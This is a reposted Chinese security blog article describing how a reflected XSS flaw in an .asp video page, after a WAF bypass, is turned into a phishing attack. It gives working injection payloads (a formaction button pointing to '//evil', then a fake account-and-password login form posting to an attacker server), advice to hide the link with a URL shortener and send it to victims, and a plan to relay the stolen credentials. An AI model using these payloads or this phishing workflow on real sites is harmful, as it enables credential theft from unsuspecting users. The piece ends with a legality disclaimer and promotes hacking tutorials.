> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KDvV3qSDDPdXmWaOlhffhw)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fuBhZCW25hNtiawibXa6jdibJO1LiaaYSDECImNTbFbhRx4BTAibjAv1wDBA/640?wx_fmt=png)

扫码领资料

获黑客教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGZQwmqcd9VRKphGbQrXxT6qjgRB1iaHPqpHcqydDZ1nN5ib60NfJRBuBbWBZEk0ZjazTH9vKtLiczMA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png)

> 作者：先知 - 熊未泯
> -----------
> 
> 原文地址：https://xz.aliyun.com/t/9549

**发现 xss 漏洞**
-------------

http://xxxxx.com/xxx.asp?videoid=1&nm=2010%C3%C0%B9%FA%D0%C4%B7%CE%B8%B4%CB%D5%D0%C2%B9%E6%B6%A8%BD%CC%D1%A7%C6%AC

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbJQpqOfVPOKYschvUXJdLxE3gjiamjmsbKxaJJTOqpibdSCjiaoFmqsQiaw/640?wx_fmt=png)

尝试注入，不出意外有 WAF  

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbF2eKub7P0JMjavHQP8MTpFl40w4ic3Tb1l6mRUtd7iagAwN2Jv1khibNw/640?wx_fmt=png)

**fuzz 尝试绕过**  

----------------

看到如下截图中绕过绕过 WAF 的 payload 的，让我联想到了之前在 Tomcat Examples 页面挖到过的点击劫持漏洞

  
Tomcat Examples 页面的点击劫持漏洞建议参考下方链接的这篇文章、

这个钓鱼页面的制作的思路我是由这个点击劫持漏洞想到的

```
挖洞经验 | 通过Tomcat Servlet示例页面发现的Cookie信息泄露漏洞
https://www.freebuf.com/articles/web/247253.html
```

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbibtMZicFxdmf1grn1t2vzEqUR2ibiaPY6s9BLxOoMMzBlqUEgJnyn18Nkw/640?wx_fmt=png)

```
fuzz出的payload
"><form><button formaction=//evil>XSS</button><textarea name=x>
```

**本地测试**
--------

通过上面 fuzz 得到的 payload, 自己搭建服务器进行实验

  
python2 使用如下命令快速启动简易的 http 服务

`python -m SimpleHTTPServer 8000`

不加端口也没事，直接使用 python -m SimpleHTTPServer 则默认端口是 8000

‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍若报错：`No module named SimpleHTTPServer`,

是因为 python3 已经改成了 http.server

python3 使用如下命令快速启动简易的 http 服务

`python -m http.server 8000`

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbjCEMwfNuS8h34fbztrdMVKuuGaebREx0vVgD83cHwIREcsMhNr0PsA/640?wx_fmt=png)

本地测试时使用的 payload  

```
"><form><button formaction=http://127.0.0.1:8000/>clickMme</button><textarea name=x>
```

把 payloa 拼接上去然后在用流量器打开

```
http://xxxxxxx.com/xxx.asp?videoid=%22%3E%3Cform%3E%3Cbutton%20formaction=http://127.0.0.1:8000/%3EclickMme%3C/button%3E%3Ctextarea%20name=x%3E
```

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbJd8ctuFJ4E7hbGAqAgB8ad1FodKVibqW1OBXwebqwMurxmO6P2KAiatA/640?wx_fmt=png)

点击 clickMe 之后就跳转到了我们搭建的服务器上  

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbZkLkLoHlrFrxvJsArhuFex62uAlbDQquVFbAiaSRZPbIYDPiclMmr1lg/640?wx_fmt=png)

**外网测试**  

-----------

大家应该有注意到了跳转成功时后面会带有一串参数，

关于这个参数我们先看一下关于`<textarea>` 标签的定义：

```
<textarea> 标签定义一个多行的文本输入控件。
文本区域中可容纳无限数量的文本，其中的文本的默认字体是等宽字体（通常是 Courier）。
可以通过 cols 和 rows 属性来规定 textarea 的尺寸大小，不过更好的办法是使用 CSS 的 height 和 width 属性
```

看到这里大家应该知道了，其实利用 fuzz 出的 payload 进行实验时后面的那个参数 x 就是`<textarea name=x>`

我们在 payload 中利用不闭合的`<textarea>`吸收掉后面多余的代码 

而 x 的参数值就是后面没用的冗余代码, 我们最终的钓鱼页面也是需要参数来传递账号密码的值的

所以这里就直接用`<textarea name=x>`结合后面冗余的代码做实验

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktb8iczaziacPpk9OPhZVria5cuYH5NIWna044kBQzOOFb1Pib6EibTeDZnfDA/640?wx_fmt=png)

先找一个互联网 web 服务页面测试 

这个页面必须要是 url 后面接着不存在的参数时仍然能正常显示的页面像下方页面这样  

比如喜马拉雅首页网址后带有不存在的参数时仍然能访问成功

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbqiaib8MgDakQia4xG1svoqSpib2KlXWxulJibRD32do5yjPDCyOBfCP9SsQ/640?wx_fmt=png)

```
payload
"><form><button formaction=https://www.ximalaya.com>clickMme</button><textarea name=x>
```

可惜在点击 clickMe 跳转后出现了 500 错误，这个例子失败了

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbLHvcHMhZaxk3d2rPoPyxj6L9xhM5NFYxhvLNzFjCnujiarBcH2Ir2eA/640?wx_fmt=png)

为什么会失败呢，我们点击 clickMe 后抓包看看

如下截图所示是应为喜马拉雅网站有进行 referer 验证  

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktb8RadmTnH2W4U3OhxibqAYxBPicug99Nib0Uk4cIlpx3J0cwDhIFJ9GUpg/640?wx_fmt=png)

喜马拉雅的例子失败了，那我们换个成功的例子看看  

```
payload
"><form><button formaction=https://www.runoob.com>clickMme</button><textarea name=x>
```

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbjkJ1X9yicic5xXzoz1eyndMGnj235BEbgvDK3kXNu9yv2sbE3qpxjUWQ/640?wx_fmt=png)

如上方菜鸟驿站的例子所示我们实验成功了

那怎么才能吧这个漏洞点利用起来呢，接着看  

**制作钓鱼页面**
----------

```
payload：
"><form action="http://127.0.0.1:8000">
account: <input type="text" ><br>
password: <input type="text"  ><br>
<input type="submit" value="submit">
</form>
```

登入框是出来了，但是 videoid 参数的位置不止一处

所以出现了两个登入框，且还有很多冗余的代码

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktb7YLb0Oxjwl6dA4ncFeHCyIZHHLlSkibb26cqMURfI91cI2zVTAAEF5Q/640?wx_fmt=png)

继续改进 payload，利用不闭合的`<textarea>`吸收掉登入框后多余的代码

```
payload:
"><form action="http://127.0.0.1:8000">
account: <input type="text" ><br>
password: <input type="text"  ><br>
<input type="submit" value="submit">
</form>
<textarea>
```

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbuf9djW7nLEWuiadiannfiasoZzZbkCNXSUUIIIxt0uOvEq803HIEXkx6w/640?wx_fmt=png)

`<textarea>`吸收掉登入框后多余的代码

但是像上方截图还是不够让人相信，那在改进一下  

```
payload:
"><form action="http://127.0.0.1:8000">
account: <input type="text" ><br>
password: <input type="text"  ><br>
<input type="submit" value="Login">
</form>
<textarea rows="1" cols="30">
please enter your account and password to login.
```

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbnWB2iaoYjaiagOQiaZQ1C34gxOZicHV1IofRPjA0UqlffbAwYQtdPyHiaWA/640?wx_fmt=png)

这个钓鱼页面我做的还不够好，若是真的上战场用于钓鱼时，可以多花些时间做的更逼真

**将钓鱼页面用于实践**
-------------

本地实践：

```
http://xxxxx.com/xxxx.asp?videoid="><form action="http://127.0.0.1:8000">account: <input type="text" ><br>
password: <input type="text" >
please enter your account and password to login.
```

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbDiaKOH8iby8BZ4g6VW4F7buZ2sFIQPxs5Ft0ZeBq6ZlAfJhibKNUoiceuQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktb4JOibxM9a1HuzxJ3AicXHwI6sqNuSwxMWNN76RLuGhjffyImoXAvFVuA/640?wx_fmt=png)

在公网上公网实践

```
http://xxxxx.com/xxxx.asp?videoid="><form action="https://www.runoob.com/">account: <input type="text" >
please enter your account and password to login.
```

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktb6zN9MtbqOibm03IyKatEYwBiaLbdicC1bxdG9tTVWElrL28AASXCjNOSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbNuZwUNhf51V6qYxDaZuJyyulI2eD7ics0jXKEPExaObiaV7Cl0AyictSg/640?wx_fmt=png)

在钓鱼时链接太长了容易被人怀疑，我们使用小码短链接这个网页生成一个短链接，

工具地址：https://xiaomark.com/

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbBwLS48p3KicibU1A91MB36J7GYtkGNj60OjOVxogwzo30hQtPibGVlySA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XYnjkohc3gibGl5HcozmS2D1biaZBNhktbLRQPMgFSv5PmKbZq9JaicUsFjicFN3ZThh0zAbhaoMvXciaTMhyCMn5ibA/640?wx_fmt=png)

生成短链接之后发送给受害者

**钓鱼页面的危害**
-----------

综上所述，思路是我们制作的这个钓鱼页面，可以诱导用户输入网站的账号密码，

被我们自己搭建在公网上的服务器获取，跳转到我们自己搭建的服务器时

我们可以在自己的服务器上写一段代码传送获取到的账号密码跳转到的这个钓鱼页面网站的真实登入页面进行登入

神不知鬼不觉 、在受害者看起来、就像是一次正常操作。

本文仅用于技术讨论，切勿用于违法途径

学习更多黑客技能！体验靶场实战练习

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGZQwmqcd9VRKphGbQrXxT6qjgRB1iaHPqpHcqydDZ1nN5ib60NfJRBuBbWBZEk0ZjazTH9vKtLiczMA/640?wx_fmt=png)

（黑客视频资料及工具）

![](https://mmbiz.qpic.cn/mmbiz_gif/CBJYPapLzSEDYDXMUyXOORnntKZKuIu5iaaqlBxRrM5G7GsnS5fY4V7PwsMWuGTaMIlgXxyYzTDWTxIUwndF8vw/640?wx_fmt=gif)

往期推荐

  

[

黑客技能｜我把熊猫烧香病毒扒了！



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247518048&idx=1&sn=14e1d28a20e1f254d75245aeafcfd278&chksm=ebeace4ddc9d475b8821abdf87807a1ffda1c6e26b0d64f9cfe86f69ae70e6f0d8625fb3cafa&scene=21#wechat_redirect)

[

实战｜一次路由器登录后台越权



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247517319&idx=1&sn=ceaa1172a3d95a2baf746e529b610c7e&chksm=ebeacdaadc9d44bc30d883d0651873a31d375d1a9c0046c3bcf555ca4c19460422e4705686b5&scene=21#wechat_redirect)

[

渗透测试 | src 实战爆破新思路



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247511230&idx=1&sn=680a1a9fcb82cbbfe980c2052a1d3ee6&chksm=ebeae593dc9d6c8562b61023381d0f6a963a3b2d770d3aa8029f4b8b0be77d80b4f39c4996d6&scene=21#wechat_redirect)

[

【教程】利用工具挖掘 XSS 漏洞



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247510812&idx=1&sn=8f21af134120e315177d096052f851b8&chksm=ebeae231dc9d6b272db9767b5df7852ba5405ee96a170f1754b1f7b4acac90df6d77c31e055f&scene=21#wechat_redirect)

[

一款针对 CTF 和渗透测试的黑客利器



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247507434&idx=1&sn=65f1f0e2d897d0eea6aa166c1e281255&chksm=ebea94c7dc9d1dd1decc4b1689b4ab3241c8d20a26500521e40e5846a290a260276ac133d256&scene=21#wechat_redirect)

[

博彩站渗透的常见切入点（技巧总结）



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247504880&idx=1&sn=0141dbcc9406456b2bff528efeec7a44&chksm=ebea9adddc9d13cb69bf1ab5e7f42ea6f46d3cc82fdba268c884ed8cb44a8d1cd96fb538fb81&scene=21#wechat_redirect)

[

超级 SQL 注入工具 (起步篇)- 附下载



](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247504815&idx=1&sn=f99f77b278028b1c8de97d488789682b&chksm=ebea9a82dc9d1394d16a7fc6d3ae6e4b606e01d5ee4d4e360e249a9620015015b5fb9c7afe9a&scene=21#wechat_redirect)